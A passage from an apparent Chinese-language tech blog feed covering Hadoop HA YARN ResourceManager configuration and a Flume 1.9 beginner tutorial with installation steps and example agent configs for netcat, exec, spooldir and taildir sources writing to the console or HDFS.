class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.webapp.address.rm3<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:8088<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 rm1 的内部通信地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.address.rm3<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:8032<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 AM 向 rm1 申请资源的地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.address.rm3<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:8030<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定供 NM 连接的地址 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.resource-tracker.address.rm3<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:8031<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 zookeeper 集群的地址 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.zk-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:2181,hadoop103:2181,hadoop104:2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 启用自动恢复 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.recovery.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定 resourcemanager 的状态信息存储在 zookeeper 集群 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.store.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.yarn.server.resourcemanager.recovery.ZKRMStateStore<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 环境变量的继承 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分发并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同步更新其他节点的配置信息</span></span><br><span class="line">xsync hadoop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 YARN</span></span><br><span class="line"><span class="comment"># 在 hadoop102 或者 hadoop103 中执行</span></span><br><span class="line">start-yarn.sh</span><br><span class="line"><span class="comment"># 查看服务状态</span></span><br><span class="line">yarn rmadmin -getServiceState rm1</span><br><span class="line"><span class="comment"># 可以去 zkCli.sh 客户端查看 ResourceManager 选举锁节点内容</span></span><br><span class="line"></span><br><span class="line">zkCli.sh</span><br><span class="line">[zk: localhost:2181(CONNECTED) 16] get -s /yarn-leader-election/cluster-yarn1/ActiveStandbyElectorLock</span><br><span class="line"></span><br><span class="line"><span class="comment"># web 端查看 hadoop102:8088 和 hadoop103:8088 的 YARN 的状态</span></span><br></pre></td></tr></table></figure><h3 id="5-3-HADOOP-HA-的最终规划">5.3 HADOOP HA 的最终规划</h3><table><thead><tr><th><strong>hadoop102</strong></th><th><strong>hadoop103</strong></th><th><strong>hadoop104</strong></th></tr></thead><tbody><tr><td>NameNode</td><td>NameNode</td><td>NameNode</td></tr><tr><td>DataNode</td><td>DataNode</td><td>DataNode</td></tr><tr><td>JournalNode</td><td>JournalNode</td><td>JournalNode</td></tr><tr><td>Zookeeper</td><td>Zookeeper</td><td>Zookeeper</td></tr><tr><td>ZKFC</td><td>ZKFC</td><td>ZKFC</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Hadoop入门&lt;/h1&gt;
&lt;h2 id=&quot;1、Hadoop概述&quot;&gt;1、Hadoop概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-简介&quot;&gt;1.1 简介&lt;/h3&gt;
&lt;p&gt;Hadoop是一个由Apache基金会所开发的分布式系统基础架构。主要解决海量数据的存储和海量数据的分析计算问题。广义上来说，Hadoop通常是指一个更广泛的概念——Hadoop生态圈。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://qnypic.shawncoding.top/blog/202401251330896.jpg&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;官网地址：&lt;a href=&quot;http://hadoop.apache.org&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;http://hadoop.apache.org&quot;&gt;http://hadoop.apache.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下载地址：&lt;a href=&quot;https://hadoop.apache.org/releases.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://hadoop.apache.org/releases.html&quot;&gt;https://hadoop.apache.org/releases.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Flume1.9基础学习</title>
    <link href="https://blog.shawncoding.top/posts/917a1f63.html"/>
    <id>https://blog.shawncoding.top/posts/917a1f63.html</id>
    <published>2024-02-06T07:03:34.000Z</published>
    <updated>2024-02-29T12:00:08.302Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Flume 入门概述</h1><h2 id="1、概述">1、概述</h2><p>Flume 是Cloudera 提供的一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统。Flume 基于流式架构，灵活简单。Flume最主要的作用就是，实时读取服务器本地磁盘的数据(或者网络端口数据)，将数据写入到HDFS</p><a id="more"></a><h2 id="2、Flume-基础架构">2、Flume 基础架构</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251329725.png" alt></p><h3 id="2-1-Agent">2.1 Agent</h3><p>Agent 是一个 JVM 进程，它以事件的形式将数据从源头送至目的。Agent 主要有 3 个部分组成，<strong>Source、Channel、Sink</strong></p><h3 id="2-2-Source">2.2 Source</h3><p>Source 是负责接收数据到 Flume Agent 的组件。Source 组件可以处理各种类型、各种格式的日志数据，包括 <strong>avro</strong>、thrift、<strong>exec</strong>、jms、<strong>spooling directory、netcat、taildir</strong>、 sequence generator、syslog、http、legacy</p><h3 id="2-3-Sink">2.3 Sink</h3><p>Sink 不断地轮询 Channel 中的事件且批量地移除它们，并将这些事件批量写入到存储或索引系统、或者被发送到另一个 Flume Agent。Sink 组件目的地包括 <strong>hdfs、logger、avro</strong>、thrift、ipc、file、HBase、solr、自定义</p><h3 id="2-4-Channel">2.4 Channel</h3><p>Channel 是位于 Source 和 Sink 之间的缓冲区。因此，Channel 允许 Source 和 Sink 运作在不同的速率上。Channel 是线程安全的，可以同时处理几个 Source 的写入操作和几个 Sink 的读取操作。Flume 自带两种 Channel：Memory Channel 和 File Channel。</p><p>Memory Channel 是内存中的队列。Memory Channel 在不需要关心数据丢失的情景下适用。如果需要关心数据丢失，那么 Memory Channel 就不应该使用，因为程序死亡、机器宕机或者重启都会导致数据丢失。File Channel 将所有事件写到磁盘。因此在程序关闭或机器宕机的情况下不会丢失数据</p><h3 id="2-5-Event">2.5 Event</h3><p>传输单元，Flume 数据传输的基本单元，以 Event 的形式将数据从源头送至目的地。 Event 由 <strong>Header</strong> 和 <strong>Body</strong> 两部分组成，Header 用来存放该 event 的一些属性，为K-V 结构， Body 用来存放该条数据，形式为字节数组</p><h2 id="3、Flume-安装部署">3、Flume 安装部署</h2><h3 id="3-1-安装地址">3.1 安装地址</h3><ul><li>Flume 官网地址：<a href="http://flume.apache.org/" target="_blank" rel="noopener" title="http://flume.apache.org/">http://flume.apache.org/</a></li><li>文档查看地址：<a href="https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html" target="_blank" rel="noopener" title="https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html">https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html</a></li><li>下载地址：<a href="http://archive.apache.org/dist/flume/" target="_blank" rel="noopener" title="http://archive.apache.org/dist/flume/">http://archive.apache.org/dist/flume/</a></li></ul><h3 id="3-2-安装部署">3.2 安装部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先已经搭建好hadoop和jdk了，可以参考之前的hadoop笔记</span></span><br><span class="line">wget http://archive.apache.org/dist/flume/1.9.0/apache-flume-1.9.0-bin.tar.gz</span><br><span class="line"><span class="comment"># 解压 apache-flume-1.9.0-bin.tar.gz 到/opt/module/目录下</span></span><br><span class="line">tar -zxf apache-flume-1.9.0-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="comment"># 修改 apache-flume-1.9.0-bin 的名称为 flume</span></span><br><span class="line">mv /opt/module/apache-flume-1.9.0-bin /opt/module/flume</span><br><span class="line"><span class="comment"># 将 lib 文件夹下的guava-11.0.2.jar 删除以兼容 Hadoop 3.1.3</span></span><br><span class="line">rm /opt/module/flume/lib/guava-11.0.2.jar</span><br></pre></td></tr></table></figure><h1>二、Flume 入门案例</h1><h2 id="1、监控端口数据官方案例">1、监控端口数据官方案例</h2><h3 id="1-1-概述">1.1 概述</h3><p>使用 Flume 监听一个端口，收集该端口数据，并打印到控制台。</p><p>首先通过netcat工具向本机的44444端口发送数据，Flume监控本机的44444端口，通过Flume的source端读取数据，最后Flume将获取的数据通过Sink端写出到控制台(测试命令使用nc localhost 44444)</p><h3 id="1-2-实现步骤">1.2 实现步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 netcat 工具</span></span><br><span class="line">sudo yum install -y nc</span><br><span class="line"><span class="comment"># nc -lk 9999</span></span><br><span class="line"><span class="comment"># nc local 9999 这样就可以聊天</span></span><br><span class="line"><span class="comment"># 判断 44444 端口是否被占用</span></span><br><span class="line">sudo netstat -nlp | grep 44444</span><br><span class="line"><span class="comment"># 创建 Flume Agent 配置文件 flume-netcat-logger.conf</span></span><br><span class="line"><span class="comment"># 在 flume 目录下创建 job 文件夹并进入 job 文件夹</span></span><br><span class="line">mkdir job </span><br><span class="line"><span class="built_in">cd</span> job/<span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment"># 在 job 文件夹下创建 Flume Agent 配置文件 flume-netcat-logger.conf</span></span><br><span class="line">vim flume-netcat-logger.conf</span><br><span class="line"><span class="comment"># 添加内容如下：</span></span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line"><span class="comment"># 一个sink只能一个channel,一个source可以多个channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先开启 flume 监听端口</span></span><br><span class="line"><span class="comment"># 第一种写法</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a1 --conf-file job/flume-netcat-logger.conf -Dflume.root.logger=INFO,console</span><br><span class="line"><span class="comment"># 第二种写法</span></span><br><span class="line">bin/flume-ng agent -c conf/ -n a1 -f job/flume-netcat-logger.conf -Dflume.root.logger=INFO,console</span><br><span class="line"><span class="comment"># --conf/-c：表示配置文件存储在 conf/目录</span></span><br><span class="line"><span class="comment"># --name/-n：表示给 agent 起名为 a1</span></span><br><span class="line"><span class="comment"># --conf-file/-f：flume 本次启动读取的配置文件是在 job 文件夹下的 flume-telnet.conf文件。</span></span><br><span class="line"><span class="comment"># -Dflume.root.logger=INFO,console ：-D 表示 flume 运行时动态修改 flume.root.logger参数属性值，并将控制台日志打印级别设置为 INFO 级别。日志级别包括:log、info、warn、 error</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 netcat 工具向本机的 44444 端口发送内容</span></span><br><span class="line">nc localhost 44444</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12/06/19 15:32:19 INFO source.NetcatSource: Source starting</span></span><br><span class="line"><span class="comment"># 12/06/19 15:32:19 INFO source.NetcatSource: Created serverSocket:sun.nio.ch.ServerSocketChannelImpl[/127.0.0.1:44444]</span></span><br><span class="line"><span class="comment"># 12/06/19 15:32:34 INFO sink.LoggerSink: Event: &#123; headers:&#123;&#125; body: 48 65 6C 6C 6F 20 77 6F 72 6C 64 21 0D          Hello world!. &#125;</span></span><br></pre></td></tr></table></figure><h2 id="2、实时监控单个追加文件">2、实时监控单个追加文件</h2><h3 id="2-1-概述">2.1 概述</h3><p>案例需求：实时监控 Hive 日志，并上传到 HDFS 中</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329727.png" alt></p><h3 id="2-2-实现步骤">2.2 实现步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Flume 要想将数据输出到 HDFS，依赖 Hadoop 相关 jar 包</span></span><br><span class="line"><span class="comment"># 检查/etc/profile.d/my_env.sh 文件，确认 Hadoop 和 Java 环境变量配置正确</span></span><br><span class="line">JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">HADOOP_HOME=/opt/module/ha/hadoop-3.1.3</span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$HADOOP_HOME</span>/bin:<span class="variable">$HADOOP_HOME</span>/sbin</span><br><span class="line"><span class="built_in">export</span> PATH JAVA_HOME HADOOP_HOME</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去job目录创建 flume-file-hdfs.conf 文件</span></span><br><span class="line">vim flume-file-hdfs.conf</span><br><span class="line"><span class="comment"># 要想读取 Linux 系统中的文件，就得按照 Linux 命令的规则执行命令。由于 Hive日志在 Linux 系统中所以读取文件的类型选择：exec 即 execute 执行的意思。表示执行Linux 命令来读取文件</span></span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a2.sources = r2</span><br><span class="line">a2.sinks = k2</span><br><span class="line">a2.channels = c2</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a2.sources.r2.type = <span class="built_in">exec</span></span><br><span class="line">a2.sources.r2.command = tail -F /opt/module/hive/logs/hive.log</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a2.sinks.k2.type = hdfs</span><br><span class="line"><span class="comment"># 去core-site.xml查看，ha集群的话改成hdfs://mycluster</span></span><br><span class="line">a2.sinks.k2.hdfs.path = hdfs://hadoop102:9870/flume/%Y%m%d/%H</span><br><span class="line"><span class="comment">#上传文件的前缀</span></span><br><span class="line">a2.sinks.k2.hdfs.filePrefix = logs-</span><br><span class="line"><span class="comment">#是否按照时间滚动文件夹</span></span><br><span class="line">a2.sinks.k2.hdfs.round = <span class="literal">true</span></span><br><span class="line"><span class="comment">#多少时间单位创建一个新的文件夹</span></span><br><span class="line">a2.sinks.k2.hdfs.roundValue = 1</span><br><span class="line"><span class="comment">#重新定义时间单位</span></span><br><span class="line">a2.sinks.k2.hdfs.roundUnit = hour</span><br><span class="line"><span class="comment">#是否使用本地时间戳</span></span><br><span class="line">a2.sinks.k2.hdfs.useLocalTimeStamp = <span class="literal">true</span></span><br><span class="line"><span class="comment">#积攒多少个 Event 才 flush 到 HDFS 一次</span></span><br><span class="line">a2.sinks.k2.hdfs.batchSize = 100</span><br><span class="line"><span class="comment">#设置文件类型，可支持压缩</span></span><br><span class="line">a2.sinks.k2.hdfs.fileType = DataStream</span><br><span class="line"><span class="comment">#多久生成一个新的文件,单位s,一般配置3600</span></span><br><span class="line">a2.sinks.k2.hdfs.rollInterval = 60</span><br><span class="line"><span class="comment">#设置每个文件的滚动大小</span></span><br><span class="line">a2.sinks.k2.hdfs.rollSize = 134217700</span><br><span class="line"><span class="comment">#文件的滚动与 Event 数量无关</span></span><br><span class="line">a2.sinks.k2.hdfs.rollCount = 0</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a2.channels.c2.type = memory</span><br><span class="line">a2.channels.c2.capacity = 1000</span><br><span class="line">a2.channels.c2.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a2.sources.r2.channels = c2</span><br><span class="line">a2.sinks.k2.channel = c2</span><br><span class="line"><span class="comment">#注意：对于所有与时间相关的转义序列，Event Header 中必须存在以 “timestamp”的key（除非 hdfs.useLocalTimeStamp 设置为 true，此方法会使用 TimestampInterceptor 自动添加 timestamp）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行 Flume</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a2 --conf-file job/flume-file-hdfs.conf</span><br><span class="line"><span class="comment"># 开启 Hadoop 和 Hive 并操作 Hive 产生日志，去hive目录，有数据才会生成新的文件</span></span><br><span class="line">bin/hive</span><br></pre></td></tr></table></figure><h2 id="3、实时监控目录下多个新文件">3、实时监控目录下多个新文件</h2><h3 id="3-1-概述">3.1 概述</h3><p>案例需求：使用 Flume 监听整个目录的文件，并上传至 HDFS</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329728.png" alt></p><h3 id="3-2-实现步骤">3.2 实现步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">vim flume-dir-hdfs.conf</span><br><span class="line">a3.sources = r3</span><br><span class="line">a3.sinks = k3</span><br><span class="line">a3.channels = c3</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a3.sources.r3.type = spooldir</span><br><span class="line">a3.sources.r3.spoolDir = /opt/module/flume/upload</span><br><span class="line">a3.sources.r3.fileSuffix = .COMPLETED</span><br><span class="line">a3.sources.r3.fileHeader = <span class="literal">true</span></span><br><span class="line"><span class="comment">#忽略所有以.tmp 结尾的文件，不上传</span></span><br><span class="line">a3.sources.r3.ignorePattern = ([^ ]*\.tmp)</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a3.sinks.k3.type = hdfs</span><br><span class="line">a3.sinks.k3.hdfs.path = hdfs://mycluster/flume/upload/%Y%m%d/%H</span><br><span class="line"><span class="comment">#上传文件的前缀</span></span><br><span class="line">a3.sinks.k3.hdfs.filePrefix = upload-</span><br><span class="line"><span class="comment">#是否按照时间滚动文件夹</span></span><br><span class="line">a3.sinks.k3.hdfs.round = <span class="literal">true</span></span><br><span class="line"><span class="comment">#多少时间单位创建一个新的文件夹</span></span><br><span class="line">a3.sinks.k3.hdfs.roundValue = 1</span><br><span class="line"><span class="comment">#重新定义时间单位</span></span><br><span class="line">a3.sinks.k3.hdfs.roundUnit = hour</span><br><span class="line"><span class="comment">#是否使用本地时间戳</span></span><br><span class="line">a3.sinks.k3.hdfs.useLocalTimeStamp = <span class="literal">true</span></span><br><span class="line"><span class="comment">#积攒多少个 Event 才 flush 到 HDFS 一次</span></span><br><span class="line">a3.sinks.k3.hdfs.batchSize = 100</span><br><span class="line"><span class="comment">#设置文件类型，可支持压缩</span></span><br><span class="line">a3.sinks.k3.hdfs.fileType = DataStream</span><br><span class="line"><span class="comment">#多久生成一个新的文件</span></span><br><span class="line">a3.sinks.k3.hdfs.rollInterval = 60</span><br><span class="line"><span class="comment">#设置每个文件的滚动大小大概是 128M</span></span><br><span class="line">a3.sinks.k3.hdfs.rollSize = 134217700</span><br><span class="line"><span class="comment">#文件的滚动与 Event 数量无关</span></span><br><span class="line">a3.sinks.k3.hdfs.rollCount = 0</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a3.channels.c3.type = memory</span><br><span class="line">a3.channels.c3.capacity = 1000</span><br><span class="line">a3.channels.c3.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a3.sources.r3.channels = c3</span><br><span class="line">a3.sinks.k3.channel = c3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动监控文件夹命令</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a3 --conf-file job/flume-dir-hdfs.conf</span><br><span class="line"><span class="comment"># 说明：在使用 Spooling Directory Source 时，不要在监控目录中创建并持续修改文件；上传完成的文件会以.COMPLETED 结尾；被监控文件夹每 500 毫秒扫描一次文件变动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向 upload 文件夹中添加文件,在/opt/module/flume 目录下创建 upload 文件夹</span></span><br><span class="line">mkdir upload</span><br><span class="line"><span class="comment"># 不能上传同名的，否则会挂掉</span></span><br><span class="line">touch atguigu.txt</span><br></pre></td></tr></table></figure><h2 id="4、实时监控目录下的多个追加文件">4、实时监控目录下的多个追加文件</h2><h3 id="4-1-概述">4.1 概述</h3><p>Exec source 适用于监控一个实时追加的文件，不能实现断点续传；Spooldir Source<br>适合用于同步新文件，但不适合对实时追加日志的文件进行监听并同步；而 <strong>Taildir Source</strong>适合用于监听多个实时追加的文件，并且能够实现断点续传</p><p>案例需求:使用 Flume 监听整个目录的实时追加文件，并上传至 HDFS</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329729.png" alt></p><h3 id="4-2-实现步骤">4.2 实现步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">vim flume-taildir-hdfs.conf</span><br><span class="line">a3.sources = r3</span><br><span class="line">a3.sinks = k3</span><br><span class="line">a3.channels = c3</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a3.sources.r3.type = TAILDIR</span><br><span class="line"><span class="comment"># 记录JSON格式的文件，记录每个尾文件的inode、绝对路径和最后位置</span></span><br><span class="line">a3.sources.r3.positionFile = 